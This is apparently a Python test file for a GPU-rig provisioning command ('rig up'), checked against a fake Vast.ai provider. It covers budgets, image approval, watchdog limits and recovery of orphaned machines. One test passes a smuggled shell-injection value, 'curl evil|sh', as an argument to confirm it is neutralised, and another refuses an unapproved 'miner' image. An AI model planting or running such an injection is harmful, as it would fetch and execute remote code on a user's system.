import datetime as dt
import io
import pathlib
import subprocess
import time
from contextlib import redirect_stdout

import pytest

from flotilla import cli
from flotilla.core import paths
from flotilla.core.storage import LocalLogStore
from flotilla.onboard.tomlw import render_toml
from flotilla.rig import commands, cron, reaper
from flotilla.rig import journal as j
from flotilla.rig import settings as rs
from flotilla.rig.providers import vast as vast_adapter
from rigkit import OFFERS, FakeVast, fake_key

T0 = dt.datetime(2026, 10, 7, 20, 0, tzinfo=dt.timezone.utc)


class Table:
    def __init__(self):
        self.text = None

    def __call__(self, argv, *, input=None, **kwargs):
        if argv == ["crontab", "-l"]:
            return subprocess.CompletedProcess(argv, 0 if self.text is not None else 1, self.text or "",
                                               "" if self.text is not None else "no crontab for max")
        self.text = input
        return subprocess.CompletedProcess(argv, 0, "", "")


@pytest.fixture
def world(tmp_path, monkeypatch, request):
    monkeypatch.setenv("TZ", "UTC")
    time.tzset()
    request.addfinalizer(time.tzset)
    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path / "config"))
    monkeypatch.setenv("FLOTILLA_NO_CENSUS", "1")
    fake_key(tmp_path)
    clock = {"at": T0}
    fake = FakeVast(offers=OFFERS, boot_polls=2)
    monkeypatch.setattr(vast_adapter, "SEND", fake)
    monkeypatch.setattr(commands, "CRON_RUN", Table())
    monkeypatch.setattr(commands, "CLOCK", lambda: clock["at"])
    monkeypatch.setattr(commands, "ALIVE", lambda pid, mark: True)
    monkeypatch.setattr(commands, "SSH_KEY", lambda: "ssh-ed25519 AAAAC3 flotilla rig")

    def sleep(seconds):
        clock["at"] += dt.timedelta(seconds=seconds)
    monkeypatch.setattr(commands, "SLEEP", sleep)
    monkeypatch.setattr(cron, "interpreter", lambda state, **kw: "/usr/bin/python3")
    state = paths.state_dir()
    state.mkdir(parents=True, exist_ok=True)
    (state / "machine.toml").write_text(render_toml({"rig": "on", "rig_provider": "vast"}), encoding="utf-8")
    project = tmp_path / "project"
    project.mkdir()
    return {"state": state, "fake": fake, "clock": clock, "root": str(project)}


def up(world, *extra):
    out = io.StringIO()
    with redirect_stdout(out):
        code = cli.main(["rig", "up", "--root", world["root"], "--as", "main session 3", *extra])
    return code, out.getvalue()


def journal(world):
    return j.Rig(LocalLogStore(world["state"] / "rig"), clock=lambda: world["clock"]["at"])


def opened(world, hours=3, budget=2.0):
    journal(world).open_session("the person", "night frames", hours=hours, budget=budget)


def test_up_raises_the_cheapest_datacenter_machine_and_waits_for_it(world):
    opened(world)
    code, out = up(world, "--why", "frames")
    machine = journal(world).machines()["m1"]
    assert code == 0 and machine.state == j.READY and machine.address.startswith("ssh4.vast.ai:")
    assert (machine.gpu, machine.hourly) == ("RTX 2080 Ti", 0.137)
    payload = world["fake"].instances[machine.instance]["payload"]
    assert payload["image"] == rs.DEFAULT_IMAGE and payload["label"] == machine.label
    assert payload["env"]["FLOTILLA_WATCHDOG_MINUTES"] == "45"
    assert world["fake"].ssh_keys[machine.instance] == ["ssh-ed25519 AAAAC3 flotilla rig"]


def test_up_without_a_session_records_a_request(world):
    code, out = up(world, "--why", 'x"; curl evil|sh; "')
    request = journal(world).requests()["r1"]
    assert code == 2 and (request.who, request.kind) == ("main session 3", "machine")
    assert "--for r1" in out and "curl" not in out and world["fake"].created == 0


def test_an_image_the_person_never_allowed_is_refused_and_requested(world):
    opened(world)
    project = pathlib.Path(world["root"])
    (project / ".flotilla").mkdir()
    (project / ".flotilla" / "project.toml").write_text(
        render_toml({"schema": 1, "rig": {"image": "ghcr.io/stranger/miner:latest"}}))
    code, out = up(world)
    request = journal(world).requests()["r1"]
    assert code == 2 and (request.kind, request.image) == ("image", "ghcr.io/stranger/miner:latest")
    assert "allow-image ghcr.io/stranger/miner:latest --for r1" in out
    assert world["fake"].created == 0 and journal(world).machines() == {}


def test_a_second_up_for_a_ready_machine_answers_it(world):
    opened(world)
    assert up(world)[0] == 0
    code, out = up(world)
    assert code == 0 and "already ready" in out and world["fake"].created == 1


def test_up_refuses_when_the_budget_would_be_passed(world):
    opened(world, budget=0.05)
    code, out = up(world)
    assert code == 2 and "budget" in out and world["fake"].created == 0


def test_no_offer_within_the_ceilings_fails_the_machine(world):
    opened(world)
    world["fake"].offers = [OFFERS[3]]
    code, out = up(world)
    assert code == 2 and "no offer" in out and journal(world).machines()["m1"].state == j.FAILED


def test_a_second_up_resumes_the_machine_coming_up(world):
    opened(world)
    world["fake"].boot_polls = 20
    code, out = up(world, "--wait", "60")
    assert code == 3 and journal(world).machines()["m1"].state == j.PROVISIONING and "again" in out
    world["fake"].boot_polls = 0
    code, out = up(world)
    assert code == 0 and world["fake"].created == 1 and journal(world).machines()["m1"].state == j.READY


def test_a_create_that_fails_after_the_service_made_it_is_reaped_as_an_orphan(world, monkeypatch):
    opened(world)
    real = world["fake"]

    def made_then_lost(method, url, headers, body, timeout):
        answer = real(method, url, headers, body, timeout)
        if method == "PUT":
            raise TimeoutError("the answer never came")
        return answer
    monkeypatch.setattr(vast_adapter, "SEND", made_then_lost)
    code, out = up(world)
    assert code == 2 and journal(world).machines()["m1"].state == j.FAILED and real.instances
    key = rs.machine_key(world["state"])
    for _ in range(2):
        reaper.reap(journal(world), commands.PROVIDERS, machine_key=key, services=("vast",))
    assert real.instances == {}


def test_the_watchdog_minutes_may_only_be_lowered(world):
    opened(world)
    assert up(world, "--watchdog-minutes", "90")[0] == 2
    code, _ = up(world, "--watchdog-minutes", "6")
    instance = journal(world).machines()["m1"].instance
    assert code == 0 and world["fake"].instances[instance]["payload"]["env"]["FLOTILLA_WATCHDOG_MINUTES"] == "6"


def test_up_refuses_while_rig_is_off(world):
    opened(world)
    (world["state"] / "machine.toml").write_text(render_toml({"rig": "off"}), encoding="utf-8")
    code, _ = up(world)
    assert code == 2 and world["fake"].created == 0


def test_a_cut_call_left_requested_is_resumed_by_its_label(world):
    opened(world)
    machine = journal(world).add_machine("s1", "vast", lambda mid: rs.label(rs.machine_key(world["state"]), mid))
    world["fake"].instances["777"] = {"label": machine.label, "actual_status": "running", "dph_total": 0.2,
                                      "ssh_host": "ssh4.vast.ai", "ssh_port": 30777}
    code, out = up(world)
    item = journal(world).machines()["m1"]
    assert code == 0 and (item.state, item.instance) == (j.READY, "777") and world["fake"].created == 0


def test_a_seats_request_carries_its_repositorys_key_from_any_worktree(world, tmp_path):
    import subprocess as sp
    from flotilla.core import repo
    main = tmp_path / "repo"
    main.mkdir()
    git = ["git", "-c", "user.name=t", "-c", "user.email=t@t"]
    sp.run([*git, "init", "-q", "-b", "main", str(main)], check=True)
    sp.run([*git, "-C", str(main), "commit", "-q", "--allow-empty", "-m", "x"], check=True)
    sp.run([*git, "-C", str(main), "worktree", "add", "-q", str(tmp_path / "seat"), "-b", "seat"], check=True)
    world["root"] = str(tmp_path / "seat")
    code, _ = up(world, "--why", "frames")
    assert code == 2 and journal(world).requests()["r1"].project == repo.identify(main).key


def test_a_session_closed_meanwhile_refuses_the_machine(world, monkeypatch):
    opened(world)
    real = j.Rig.add_machine

    def close_first(self, *args, **kwargs):
        self.set_session("s1", j.CLOSING, reason="closed by the person")
        return real(self, *args, **kwargs)
    monkeypatch.setattr(j.Rig, "add_machine", close_first)
    code, out = up(world)
    assert code == 2 and "not open" in out and world["fake"].created == 0


def test_a_machine_is_not_ready_until_the_rig_key_is_on_it(world, monkeypatch):
    opened(world)
    real = world["fake"]

    def no_key(method, url, headers, body, timeout):
        if "/ssh/" in url:
            return 500, b'{"error": true, "msg": "try later"}'
        return real(method, url, headers, body, timeout)
    monkeypatch.setattr(vast_adapter, "SEND", no_key)
    code, out = up(world, "--wait", "30")
    assert code == 3 and journal(world).machines()["m1"].state == j.PROVISIONING
    monkeypatch.setattr(vast_adapter, "SEND", real)
    code, out = up(world)
    machine = journal(world).machines()["m1"]
    assert code == 0 and machine.state == j.READY and len(real.ssh_keys[machine.instance]) == 1


def test_a_machine_adopted_by_its_label_gets_the_rig_key(world, monkeypatch):
    opened(world)
    real = world["fake"]

    def killed_after_create(method, url, headers, body, timeout):
        answer = real(method, url, headers, body, timeout)
        if method == "PUT":
            raise SystemExit("the seat's Bash timeout killed the call")
        return answer
    monkeypatch.setattr(vast_adapter, "SEND", killed_after_create)
    with pytest.raises(SystemExit):
        up(world)
    assert journal(world).machines()["m1"].state == j.REQUESTED
    monkeypatch.setattr(vast_adapter, "SEND", real)
    code, out = up(world)
    machine = journal(world).machines()["m1"]
    assert code == 0 and real.created == 1 and len(real.ssh_keys[machine.instance]) == 1
